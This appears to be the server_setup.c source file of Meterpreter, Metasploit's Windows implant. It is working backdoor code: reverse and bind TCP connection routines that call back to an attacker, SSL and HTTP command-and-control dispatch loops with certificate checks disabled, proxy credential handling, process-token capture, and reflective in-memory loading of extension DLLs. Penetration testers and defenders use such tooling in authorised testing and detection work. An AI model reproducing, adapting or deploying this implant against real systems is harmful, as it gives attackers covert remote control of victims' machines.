/*!
 * @file server_setup.c
 */
#include "metsrv.h"
#include "../../common/common.h"
#include <ws2tcpip.h>

extern Command *extensionCommands;

char * global_meterpreter_transport = "METERPRETER_TRANSPORT_SSL\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
char * global_meterpreter_url = "https://XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX/\x00";
char * global_meterpreter_ua = "METERPRETER_UA\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
char * global_meterpreter_proxy = "METERPRETER_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
char * global_meterpreter_proxy_username = "METERPRETER_USERNAME_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
char * global_meterpreter_proxy_password = "METERPRETER_PASSWORD_PROXY\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
int global_expiration_timeout = 0xb64be661;
int global_comm_timeout       = 0xaf79257f;

/*! @brief Number of milliseconds to wait before connection retries. */
const DWORD RETRY_TIMEOUT_MS = 1000;

#include <windows.h> // for EXCEPTION_ACCESS_VIOLATION
#include <excpt.h>

// NOTE: _CRT_SECURE_NO_WARNINGS has been added to Configuration->C/C++->Preprocessor->Preprocessor

// include the Reflectiveloader() function
#include "../ReflectiveDLLInjection/dll/src/ReflectiveLoader.c"

int exceptionfilter(unsigned int code, struct _EXCEPTION_POINTERS *ep)
{
	return EXCEPTION_EXECUTE_HANDLER;
}

#define InitAppInstance() { if( hAppInstance == NULL ) hAppInstance = GetModuleHandle( NULL ); }

#define PREPEND_ERROR "### Error: "
#define PREPEND_INFO  "### Info : "
#define PREPEND_WARN  "### Warn : "

/*! @brief This thread is the main server thread. */
static THREAD * serverThread = NULL;

/*! @brief An array of locks for use by OpenSSL. */
static LOCK ** ssl_locks = NULL;

/*!
 * @brief Connects to a provided host/port (IPv4), downloads a payload and executes it.
 * @param host String containing the name or IP of the host to connect to.
 * @param port Port number to connect to.
 * @param retryAttempts The number of times to attempt to retry.
 */
DWORD reverse_tcp4(const char* host, u_short port, short retryAttempts, SOCKET* socketBuffer)
{
	*socketBuffer = 0;

	// start by attempting to fire up Winsock.
	WSADATA wsaData = { 0 };
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
	{
		return WSAGetLastError();
	}

	// prepare to connect to the attacker
	SOCKET socketHandle = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	struct hostent* target = gethostbyname(host);
	char* targetIp = inet_ntoa(*(struct in_addr *)*target->h_addr_list);

	SOCKADDR_IN sock = { 0 };
	sock.sin_addr.s_addr = inet_addr(targetIp);
	sock.sin_family = AF_INET;
	sock.sin_port = htons(port);

	// try connect to the attacker at least once
	while (connect(socketHandle, (SOCKADDR*)&sock, sizeof(sock)) == SOCKET_ERROR)
	{
		// retry with a sleep if it fails, or exit the process on failure
		if (retryAttempts-- <= 0)
		{
			return WSAGetLastError();
		}

		Sleep(RETRY_TIMEOUT_MS);
	}

	*socketBuffer = socketHandle;

	return ERROR_SUCCESS;
}

/*!
 * @brief Connects to a provided host/port (IPv6), downloads a payload and executes it.
 * @param host String containing the name or IP of the host to connect to.
 * @param service The target service/port.
 * @param scopeId IPv6 scope ID.
 * @param retryAttempts The number of times to attempt to retry.
 */
DWORD reverse_tcp6(const char* host, const char* service, ULONG scopeId, short retryAttempts, SOCKET* socketBuffer)
{
	*socketBuffer = 0;

	// start by attempting to fire up Winsock.
	WSADATA wsaData = { 0 };
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
	{
		return WSAGetLastError();
	}

	ADDRINFO hints = { 0 };
	hints.ai_family = AF_INET6;
	hints.ai_socktype = SOCK_STREAM;
	hints.ai_protocol = IPPROTO_TCP;

	LPADDRINFO addresses;
	if (getaddrinfo(host, service, &hints, &addresses) != 0)
	{
		return WSAGetLastError();
	}


	// prepare to connect to the attacker
	SOCKET socketHandle = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);

	if (socketHandle == INVALID_SOCKET)
	{
		dprintf("[STAGELESS IPV6] failed to connect to attacker");
		return WSAGetLastError();
	}

	dprintf("[STAGELESS IPV6] Socket successfully created");
	while (retryAttempts-- > 0)
	{
		dprintf("[STAGELESS IPV6] Attempt %u", retryAttempts + 1);
		for (LPADDRINFO address = addresses; address != NULL; address = address->ai_next)
		{
			((LPSOCKADDR_IN6)address->ai_addr)->sin6_scope_id = scopeId;

			if (connect(socketHandle, address->ai_addr, (int)address->ai_addrlen) != SOCKET_ERROR)
			{
				dprintf("[STAGELESS IPV6] Socket successfully connected");
				*socketBuffer = socketHandle;
				freeaddrinfo(addresses);
				return ERROR_SUCCESS;
			}
		}

		Sleep(RETRY_TIMEOUT_MS);
	}

	closesocket(socketHandle);
	freeaddrinfo(addresses);
	return WSAGetLastError();

}

/*!
 * @brief Listens on a port for an incoming payload request.
 * @param port Port number to listen on.
 */
DWORD bind_tcp(u_short port, SOCKET* socketBuffer)
{
	*socketBuffer = 0;

	// start by attempting to fire up Winsock.
	WSADATA wsaData = { 0 };
	if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
	{
		return WSAGetLastError();
	}

	// prepare a connection listener for the attacker to connect to
	SOCKET listenSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

	struct sockaddr_in sock = { 0 };
	sock.sin_addr.s_addr = inet_addr("0.0.0.0");
	sock.sin_family = AF_INET;
	sock.sin_port = htons(port);

	if (bind(listenSocket, (SOCKADDR *)&sock, sizeof(struct sockaddr_in)) == SOCKET_ERROR)
	{
		return WSAGetLastError();
	}

	if (listen(listenSocket, 1) == SOCKET_ERROR)
	{
		return WSAGetLastError();
	}

	// Setup, ready to go, now wait for the connection.
	SOCKET acceptSocket = accept(listenSocket, NULL, NULL);

	// don't bother listening for other connections
	closesocket(listenSocket);

	if (acceptSocket == INVALID_SOCKET)
	{
		return WSAGetLastError();
	}

	*socketBuffer = acceptSocket;
	return ERROR_SUCCESS;
}

DWORD estbalish_tcp_connection(char* url, SOCKET* socketBuffer)
{
	dprintf("[STAGELESS] Url: %s", url);
	if (strncmp(url, "tcp", 3) == 0)
	{
		const int iRetryAttempts = 30;
		char* pHost = strstr(url, "//") + 2;
		char* pPort = strrchr(pHost, ':') + 1;

		// check if we're using IPv6
		if (url[3] == '6')
		{
			dprintf("[STAGELESS] IPv6");
			char* pScopeId = strrchr(pHost, '?') + 1;
			*(pScopeId - 1) = '\0';
			*(pPort - 1) = '\0';
			dprintf("[STAGELESS] IPv6 host %s port %s scopeid %s", pHost, pPort, pScopeId);
			return reverse_tcp6(pHost, pPort, atol(pScopeId), iRetryAttempts, socketBuffer);
		}

		dprintf("[STAGELESS] IPv4");
		u_short usPort = (u_short)atoi(pPort);

		// if no host is specified, then we can assume that this is a bind payload, otherwise
		// we'll assume that the payload is a reverse_tcp one and the given host is valid
		// TODO: check to make sure this is a valid thing to do with IPv6
		if (*pHost == ':')
		{
			dprintf("[STAGELESS] IPv4 bind port %s", pPort);
			return bind_tcp(usPort, socketBuffer);
		}

		*(pPort - 1) = '\0';
		dprintf("[STAGELESS] IPv4 host %s port %s", pHost, pPort);
		return reverse_tcp4(pHost, usPort, iRetryAttempts, socketBuffer);
	}
	return ERROR_SUCCESS;
}

/*!
 * @brief A callback function used by OpenSSL to leverage native system locks.
 * @param mode The lock mode to set.
 * @param type The lock type to operate on.
 * @param file Unused.
 * @param line Unused.
 */
static VOID server_locking_callback(int mode, int type, const char * file, int line)
{
	if (mode & CRYPTO_LOCK)
	{
		lock_acquire(ssl_locks[type]);
	}
	else
	{
		lock_release(ssl_locks[type]);
	}
}

/*!
 * @brief A callback function used by OpenSSL to get the current threads id.
 * @returns The current thread ID.
 * @remarks While not needed on windows this must be used for posix meterpreter.
 */
static long unsigned int server_threadid_callback(VOID)
{
	return GetCurrentThreadId();
}

/*!
 * @brief A callback function for dynamic lock creation for OpenSSL.
 * @returns A pointer to a lock that can be used for synchronisation.
 * @param file _Ignored_
 * @param line _Ignored_
 */
static struct CRYPTO_dynlock_value* server_dynamiclock_create(const char * file, int line)
{
	return (struct CRYPTO_dynlock_value*)lock_create();
}

/*!
 * @brief A callback function for dynamic lock locking for OpenSSL.
 * @param mode A bitmask which indicates the lock mode.
 * @param l A point to the lock instance.
 * @param file _Ignored_
 * @param line _Ignored_
 */
static void server_dynamiclock_lock(int mode, struct CRYPTO_dynlock_value* l, const char* file, int line)
{
	LOCK * lock = (LOCK *)l;

	if (mode & CRYPTO_LOCK)
	{
		lock_acquire(lock);
	}
	else
	{
		lock_release(lock);
	}
}

/*!
 * @brief A callback function for dynamic lock destruction for OpenSSL.
 * @param l A point to the lock instance.
 * @param file _Ignored_
 * @param line _Ignored_
 */
static void server_dynamiclock_destroy(struct CRYPTO_dynlock_value* l, const char * file, int line)
{
	lock_destroy((LOCK *)l);
}

/*!
 * @brief Flush all pending data on the connected socket before doing SSL.
 * @param remote Pointer to the remote instance.
 */
static VOID server_socket_flush(Remote * remote)
{
	fd_set fdread;
	DWORD ret;
	SOCKET fd;
	char buff[4096];

	lock_acquire(remote->lock);

	fd = remote_get_fd(remote);

	while (1)
	{
		struct timeval tv;
		LONG data;

		FD_ZERO(&fdread);
		FD_SET(fd, &fdread);

		// Wait for up to one second for any errant socket data to appear
		tv.tv_sec = 1;
		tv.tv_usec = 0;

		data = select((int)fd + 1, &fdread, NULL, NULL, &tv);
		if (data == 0)
		{
			break;
		}

		ret = recv(fd, buff, sizeof(buff), 0);
		dprintf("[SERVER] Flushed %d bytes from the buffer", ret);

		// The socket closed while we waited
		if (ret == 0)
		{
			break;
		}
		continue;
	}

	lock_release(remote->lock);
}

/*!
 * @brief Poll a socket for data to recv and block when none available.
 * @param remote Pointer to the remote instance.
 * @param timeout Amount of time to wait before the poll times out.
 */
static LONG server_socket_poll(Remote * remote, long timeout)
{
	struct timeval tv;
	LONG result;
	fd_set fdread;
	SOCKET fd;

	lock_acquire(remote->lock);

	fd = remote_get_fd(remote);

	FD_ZERO(&fdread);
	FD_SET(fd, &fdread);

	tv.tv_sec = 0;
	tv.tv_usec = timeout;

	result = select((int)fd + 1, &fdread, NULL, NULL, &tv);

	lock_release(remote->lock);

	return result;
}

/*!
 * @brief Initialize the OpenSSL subsystem for use in a multi threaded enviroment.
 * @param remote Pointer to the remote instance.
 */
static BOOL server_initialize_ssl(Remote * remote)
{
	int i = 0;

	lock_acquire(remote->lock);

	// Begin to bring up the OpenSSL subsystem...
	CRYPTO_malloc_init();
	SSL_load_error_strings();
	SSL_library_init();

	// Setup the required OpenSSL multi-threaded enviroment...
	ssl_locks = (LOCK**)malloc(CRYPTO_num_locks() * sizeof(LOCK *));
	if (ssl_locks == NULL)
	{
		lock_release(remote->lock);
		return FALSE;
	}

	for (i = 0; i < CRYPTO_num_locks(); i++)
	{
		ssl_locks[i] = lock_create();
	}

	CRYPTO_set_id_callback(server_threadid_callback);
	CRYPTO_set_locking_callback(server_locking_callback);
	CRYPTO_set_dynlock_create_callback(server_dynamiclock_create);
	CRYPTO_set_dynlock_lock_callback(server_dynamiclock_lock);
	CRYPTO_set_dynlock_destroy_callback(server_dynamiclock_destroy);

	lock_release(remote->lock);

	return TRUE;
}

/*!
 * @brief Bring down the OpenSSL subsystem
 * @return Indication of success or failure.
 * @param remote Pointer to the remote instance.
 */
static BOOL server_destroy_ssl(Remote * remote)
{
	int i = 0;

	if (remote == NULL)
	{
		return FALSE;
	}

	dprintf("[SERVER] Destroying SSL");

	lock_acquire(remote->lock);

	SSL_free(remote->ssl);

	SSL_CTX_free(remote->ctx);

	CRYPTO_set_locking_callback(NULL);
	CRYPTO_set_id_callback(NULL);
	CRYPTO_set_dynlock_create_callback(NULL);
	CRYPTO_set_dynlock_lock_callback(NULL);
	CRYPTO_set_dynlock_destroy_callback(NULL);

	for (i = 0; i < CRYPTO_num_locks(); i++)
	{
		lock_destroy(ssl_locks[i]);
	}

	free(ssl_locks);

	lock_release(remote->lock);

	return TRUE;
}

/*
 */
/*!
 * @brief Negotiate SSL on the socket.
 * @return Indication of success or failure.
 * @param remote Pointer to the remote instance.
 */
static BOOL server_negotiate_ssl(Remote *remote)
{
	BOOL success = TRUE;
	SOCKET fd = 0;
	DWORD ret = 0;
	DWORD res = 0;

	lock_acquire(remote->lock);

	do
	{
		fd = remote_get_fd(remote);

		remote->meth = TLSv1_client_method();

		remote->ctx = SSL_CTX_new(remote->meth);
		SSL_CTX_set_mode(remote->ctx, SSL_MODE_AUTO_RETRY);

		remote->ssl = SSL_new(remote->ctx);
		SSL_set_verify(remote->ssl, SSL_VERIFY_NONE, NULL);

		if (SSL_set_fd(remote->ssl, (int)remote->fd) == 0)
		{
			dprintf("[SERVER] set fd failed");
			success = FALSE;
			break;
		}

		do
		{
			if ((ret = SSL_connect(remote->ssl)) != 1)
			{
				res = SSL_get_error(remote->ssl, ret);
				dprintf("[SERVER] connect failed %d\n", res);

				if (res == SSL_ERROR_WANT_READ || res == SSL_ERROR_WANT_WRITE)
				{
					// Catch non-blocking socket errors and retry
					continue;
				}

				success = FALSE;
				break;
			}
		} while (ret != 1);

		if (success == FALSE) break;

		dprintf("[SERVER] Sending a HTTP GET request to the remote side...");

		if ((ret = SSL_write(remote->ssl, "GET /123456789 HTTP/1.0\r\n\r\n", 27)) <= 0)
		{
			dprintf("[SERVER] SSL write failed during negotiation with return: %d (%d)", ret, SSL_get_error(remote->ssl, ret));
		}

	} while (0);

	lock_release(remote->lock);

	dprintf("[SERVER] Completed writing the HTTP GET request: %d", ret);

	if (ret < 0)
	{
		success = FALSE;
	}

	return success;
}

/*!
 * @brief The servers main dispatch loop for incoming requests using SSL over TCP
 * @param remote Pointer to the remote endpoint for this server connection.
 * @returns Indication of success or failure.
 */
static DWORD server_dispatch(Remote * remote)
{
	BOOL running = TRUE;
	LONG result = ERROR_SUCCESS;
	Packet * packet = NULL;
	THREAD * cpt = NULL;

	dprintf("[DISPATCH] entering server_dispatch( 0x%08X )", remote);

	// Bring up the scheduler subsystem.
	result = scheduler_initialize(remote);
	if (result != ERROR_SUCCESS)
	{
		return result;
	}

	while (running)
	{
		if (event_poll(serverThread->sigterm, 0))
		{
			dprintf("[DISPATCH] server dispatch thread signaled to terminate...");
			break;
		}

		result = server_socket_poll(remote, 100);
		if (result > 0)
		{
			result = packet_receive(remote, &packet);
			if (result != ERROR_SUCCESS)
			{
				dprintf("[DISPATCH] packet_receive returned %d, exiting dispatcher...", result);
				break;
			}

			running = command_handle(remote, packet);
			dprintf("[DISPATCH] command_process result: %s", (running ? "continue" : "stop"));
		}
		else if (result < 0)
		{
			dprintf("[DISPATCH] server_socket_poll returned %d, exiting dispatcher...", result);
			break;
		}
	}

	dprintf("[DISPATCH] calling scheduler_destroy...");
	scheduler_destroy();

	dprintf("[DISPATCH] calling command_join_threads...");
	command_join_threads();

	dprintf("[DISPATCH] leaving server_dispatch.");

	return result;
}

/*
 * The servers main dispatch loop for incoming requests using SSL over TCP
 */
static DWORD server_dispatch_http_wininet(Remote * remote)
{
	BOOL running = TRUE;
	LONG result = ERROR_SUCCESS;
	Packet * packet = NULL;
	THREAD * cpt = NULL;
	URL_COMPONENTS bits;
	DWORD ecount = 0;
	DWORD delay = 0;
	char tmpHostName[512];
	char tmpUrlPath[1024];

	remote->expiration_time = 0;
	if (global_expiration_timeout > 0)
	{
		remote->expiration_time = current_unix_timestamp() + global_expiration_timeout;
	}

	remote->comm_timeout = global_comm_timeout;
	remote->start_time = current_unix_timestamp();
	remote->comm_last_packet = current_unix_timestamp();

	// Allocate the top-level handle
	if (!strcmp(global_meterpreter_proxy, "METERPRETER_PROXY"))
	{
		remote->hInternet = InternetOpen(global_meterpreter_ua, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	}
	else
	{
		remote->hInternet = InternetOpen(global_meterpreter_ua, INTERNET_OPEN_TYPE_PROXY, global_meterpreter_proxy, NULL, 0);
	}

	if (!remote->hInternet)
	{
		dprintf("[DISPATCH] Failed InternetOpen: %d", GetLastError());
		return 0;
	}

	dprintf("[DISPATCH] Configured hInternet: 0x%.8x", remote->hInternet);

	// The InternetCrackUrl method was poorly designed...
	memset(tmpHostName, 0, sizeof(tmpHostName));
	memset(tmpUrlPath, 0, sizeof(tmpUrlPath));

	memset(&bits, 0, sizeof(bits));
	bits.dwStructSize = sizeof(bits);
	bits.dwHostNameLength = sizeof(tmpHostName)-1;
	bits.lpszHostName = tmpHostName;
	bits.dwUrlPathLength = sizeof(tmpUrlPath)-1;
	bits.lpszUrlPath = tmpUrlPath;

	InternetCrackUrl(remote->url, 0, 0, &bits);

	remote->uri = _strdup(tmpUrlPath);

	dprintf("[DISPATCH] Configured URL: %s", remote->uri);
	dprintf("[DISPATCH] Host: %s Port: %u", tmpHostName, bits.nPort);

	// Allocate the connection handle
	remote->hConnection = InternetConnect(remote->hInternet, tmpHostName, bits.nPort, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
	if (!remote->hConnection)
	{
		dprintf("[DISPATCH] Failed InternetConnect: %d", GetLastError());
		return 0;
	}

	dprintf("[DISPATCH] Configured hConnection: 0x%.8x", remote->hConnection);

	//authentication
	if (!(strcmp(global_meterpreter_proxy_username, "METERPRETER_USERNAME_PROXY") == 0))
	{
		InternetSetOption(remote->hConnection, INTERNET_OPTION_PROXY_USERNAME, global_meterpreter_proxy_username, (DWORD)strlen(global_meterpreter_proxy_username) + 1);
		InternetSetOption(remote->hConnection, INTERNET_OPTION_PROXY_PASSWORD, global_meterpreter_proxy_password, (DWORD)strlen(global_meterpreter_proxy_password) + 1);
		dprintf("[DISPATCH] Proxy authentication configured : %s/%s", global_meterpreter_proxy_username, global_meterpreter_proxy_password);
	}

	// Bring up the scheduler subsystem.
	result = scheduler_initialize(remote);
	if (result != ERROR_SUCCESS)
	{
		return result;
	}

	while (running)
	{
		if (remote->comm_timeout != 0 && remote->comm_last_packet + remote->comm_timeout < current_unix_timestamp())
		{
			dprintf("[DISPATCH] Shutting down server due to communication timeout");
			break;
		}

		if (remote->expiration_time != 0 && remote->expiration_time < current_unix_timestamp())
		{
			dprintf("[DISPATCH] Shutting down server due to hardcoded expiration time");
			dprintf("Timestamp: %u  Expiration: %u", current_unix_timestamp(), remote->expiration_time);
			break;
		}

		if (event_poll(serverThread->sigterm, 0))
		{
			dprintf("[DISPATCH] server dispatch thread signaled to terminate...");
			break;
		}

		dprintf("[DISPATCH] Reading data from the remote side...");
		result = packet_receive(remote, &packet);
		if (result != ERROR_SUCCESS)
		{

			// Update the timestamp for empty replies
			if (result == ERROR_EMPTY)
			{
				remote->comm_last_packet = current_unix_timestamp();
			}

			if (ecount < 10)
			{
				delay = 10 * ecount;
			}
			else
			{
				delay = 100 * ecount;
			}

			ecount++;

			dprintf("[DISPATCH] no pending packets, sleeping for %dms...", min(10000, delay));
			Sleep(min(10000, delay));
			continue;
		}

		remote->comm_last_packet = current_unix_timestamp();

		// Reset the empty count when we receive a packet
		ecount = 0;

		dprintf("[DISPATCH] Returned result: %d", result);

		running = command_handle(remote, packet);
		dprintf("[DISPATCH] command_process result: %s", (running ? "continue" : "stop"));
	}

	// Close WinInet handles
	InternetCloseHandle(remote->hConnection);
	InternetCloseHandle(remote->hInternet);

	dprintf("[DISPATCH] calling scheduler_destroy...");
	scheduler_destroy();

	dprintf("[DISPATCH] calling command_join_threads...");
	command_join_threads();

	dprintf("[DISPATCH] leaving server_dispatch.");

	return result;
}

/*
 * Get the session id that this meterpreter server is running in.
 */
DWORD server_sessionid()
{
	typedef BOOL (WINAPI * PROCESSIDTOSESSIONID)( DWORD pid, LPDWORD id );

	static PROCESSIDTOSESSIONID pProcessIdToSessionId = NULL;
	HMODULE hKernel   = NULL;
	DWORD dwSessionId = 0;

	do
	{
		if (!pProcessIdToSessionId)
		{
			hKernel = LoadLibrary("kernel32.dll");
			if (hKernel)
			{
				pProcessIdToSessionId = (PROCESSIDTOSESSIONID)GetProcAddress(hKernel, "ProcessIdToSessionId");
			}
		}

		if (!pProcessIdToSessionId)
		{
			break;
		}

		if (!pProcessIdToSessionId(GetCurrentProcessId(), &dwSessionId))
		{
			dwSessionId = -1;
		}

	} while( 0 );

	if (hKernel)
	{
		FreeLibrary(hKernel);
	}

	return dwSessionId;
}

VOID load_stageless_extensions(Remote* pRemote, ULONG_PTR fd)
{
	LPBYTE pExtensionStart = (LPBYTE)fd + sizeof(DWORD);
	DWORD size = *((LPDWORD)(pExtensionStart - sizeof(DWORD)));

	while (size > 0)
	{
		dprintf("[SERVER] Extension located at 0x%p: %u bytes", pExtensionStart, size);
		HMODULE hLibrary = LoadLibraryR(pExtensionStart, size);
		dprintf("[SERVER] Extension located at 0x%p: %u bytes loaded to %x", pExtensionStart, size, hLibrary);
		initialise_extension(hLibrary, TRUE, pRemote, NULL, extensionCommands);

		pExtensionStart += size + sizeof(DWORD);
		size = *((LPDWORD)(pExtensionStart - sizeof(DWORD)));
	}

	dprintf("[SERVER] All stageless extensions loaded");
}

/*
 * Setup and run the server. This is called from Init via the loader.
 */
DWORD server_setup(SOCKET fd)
{
	Remote* pRemote = NULL;
	char cStationName[256] = { 0 };
	char cDesktopName[256] = { 0 };
	DWORD res = 0;

	// first byte of the URL indites 's' if it's stageless
	BOOL bStageless = global_meterpreter_url[0] == 's';

	dprintf("[SERVER] Initializing...");

	// if hAppInstance is still == NULL it means that we havent been
	// reflectivly loaded so we must patch in the hAppInstance value
	// for use with loading server extensions later.
	InitAppInstance();

	srand((unsigned int)time(NULL));

	__try
	{
		do
		{
			dprintf("[SERVER] module loaded at 0x%08X", hAppInstance);

			// Open a THREAD item for the servers main thread, we use this to manage migration later.
			serverThread = thread_open();

			dprintf("[SERVER] main server thread: handle=0x%08X id=0x%08X sigterm=0x%08X", serverThread->handle, serverThread->id, serverThread->sigterm);

			if (!(pRemote = remote_allocate(fd)))
			{
				SetLastError(ERROR_NOT_ENOUGH_MEMORY);
				break;
			}

			pRemote->url = global_meterpreter_url;
			if (bStageless)
			{
				// if stageless, we ignore the first 's'
				pRemote->url += 1;
			}

			if (strcmp(global_meterpreter_transport + 12, "TRANSPORT_SSL") == 0)
			{
				pRemote->transport = METERPRETER_TRANSPORT_SSL;
				dprintf("[SERVER] Using SSL transport on socket %ul...", fd);

				dprintf("[SERVER] setting up stageless comms if required...");
				res = estbalish_tcp_connection(pRemote->url, &pRemote->fd);
				if (res != ERROR_SUCCESS)
				{
					dprintf("[SERVER] Failed to get TCP communications running: %u (%x)", res, res);
					break;
				}
			}
			else if (strcmp(global_meterpreter_transport + 12, "TRANSPORT_HTTPS") == 0)
			{
				pRemote->transport = METERPRETER_TRANSPORT_HTTPS;
				dprintf("[SERVER] Using HTTPS transport...");
			}
			else if (strcmp(global_meterpreter_transport + 12, "TRANSPORT_HTTP") == 0)
			{
				pRemote->transport = METERPRETER_TRANSPORT_HTTP;
				dprintf("[SERVER] Using HTTP transport...");
			}

			// Do not allow the file descriptor to be inherited by child processes
			SetHandleInformation((HANDLE)pRemote->fd, HANDLE_FLAG_INHERIT, 0);

			dprintf("[SERVER] Initializing tokens...");

			// Store our thread handle
			pRemote->hServerThread = serverThread->handle;

			// Store our process token
			if (!OpenThreadToken(pRemote->hServerThread, TOKEN_ALL_ACCESS, TRUE, &pRemote->hServerToken))
			{
				OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &pRemote->hServerToken);
			}

			// Copy it to the thread token
			pRemote->hThreadToken = pRemote->hServerToken;

			// Save the initial session/station/desktop names...
			pRemote->dwOrigSessionId = server_sessionid();
			pRemote->dwCurrentSessionId = pRemote->dwOrigSessionId;
			GetUserObjectInformation(GetProcessWindowStation(), UOI_NAME, &cStationName, 256, NULL);
			pRemote->cpOrigStationName = _strdup(cStationName);
			pRemote->cpCurrentStationName = _strdup(cStationName);
			GetUserObjectInformation(GetThreadDesktop(GetCurrentThreadId()), UOI_NAME, &cDesktopName, 256, NULL);
			pRemote->cpOrigDesktopName = _strdup(cDesktopName);
			pRemote->cpCurrentDesktopName = _strdup(cDesktopName);

			// Process our default SSL-over-TCP transport
			if (pRemote->transport == METERPRETER_TRANSPORT_SSL)
			{
				dprintf("[SERVER] Flushing the socket handle...");
				server_socket_flush(pRemote);

				dprintf("[SERVER] Initializing SSL...");
				if (!server_initialize_ssl(pRemote))
				{
					break;
				}

				dprintf("[SERVER] Negotiating SSL...");
				if (!server_negotiate_ssl(pRemote))
				{
					break;
				}

				dprintf("[SERVER] Registering dispatch routines...");
				register_dispatch_routines();

				if (bStageless)
				{
					// in the case of stageless payloads, fd contains a pointer to the extensions
					// to load
					dprintf("[SERVER] Loading stageless extensions");
					load_stageless_extensions(pRemote, (ULONG_PTR)fd);
				}

				dprintf("[SERVER] Entering the main server dispatch loop for transport %d...", pRemote->transport);
				server_dispatch(pRemote);

				dprintf("[SERVER] Deregistering dispatch routines...");
				deregister_dispatch_routines(pRemote);
			}

			if (pRemote->transport == METERPRETER_TRANSPORT_HTTP || pRemote->transport == METERPRETER_TRANSPORT_HTTPS)
			{
				dprintf("[SERVER] Registering dispatch routines...");
				register_dispatch_routines();

				if (bStageless)
				{
					// in the case of stageless payloads, fd contains a pointer to the extensions
					// to load
					dprintf("[SERVER] Loading stageless extensions");
					load_stageless_extensions(pRemote, (ULONG_PTR)fd);
				}

				dprintf("[SERVER] Entering the main server dispatch loop for transport %d...", pRemote->transport);
				server_dispatch_http_wininet(pRemote);

				dprintf("[SERVER] Deregistering dispatch routines...");
				deregister_dispatch_routines(pRemote);
			}

		} while (0);

		if (pRemote->transport == METERPRETER_TRANSPORT_SSL)
		{
			dprintf("[SERVER] Closing down SSL...");
			server_destroy_ssl(pRemote);
		}

		if (pRemote)
		{
			remote_deallocate(pRemote);
		}
	}
	__except (exceptionfilter(GetExceptionCode(), GetExceptionInformation()))
	{
		dprintf("[SERVER] *** exception triggered!");

		thread_kill(serverThread);
	}

	dprintf("[SERVER] Finished.");
	return res;
}
